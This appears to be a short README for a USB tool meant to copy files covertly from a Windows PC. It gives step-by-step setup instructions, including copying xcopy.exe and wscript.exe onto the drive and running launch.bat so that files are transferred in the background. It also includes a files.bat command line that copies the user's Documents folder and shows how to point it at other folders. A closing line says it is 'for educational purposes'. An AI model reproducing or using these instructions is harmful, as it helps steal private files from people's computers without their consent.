This is a few files that you copy to your USB drive to discretely obtain files from a Windows PC.

Instructions:

Download files from Github and place them into your USB Drive.
Create a new folder named "All" (this is where your newly obtained files will be located.)
Go to your Windows/system32 folder and copy the following files to your USB Drive: xcopy.exe wscript.exe
So by now you should have 6 files, and 1 empty folder on your USB drive.
Safely unplug your USB drive, and test it on your machine.
Plug it in, if it does not automatically run, click on launch.bat

The program will launch, and the files will be transferred to your USB drive in the background.  

The files.bat is where you change what data you want to obtain. EXAMPLE: %backupcmd% "%USERPROFILE%\Documents" "%drive%\All\S Documents" can be changed to: %backupcmd% "%USERPROFILE%\Downloads" "%drive%\All\S Downloads"

This was created for educational purposes.
https://github.com/spdghost408/GhostUSBtool/wiki
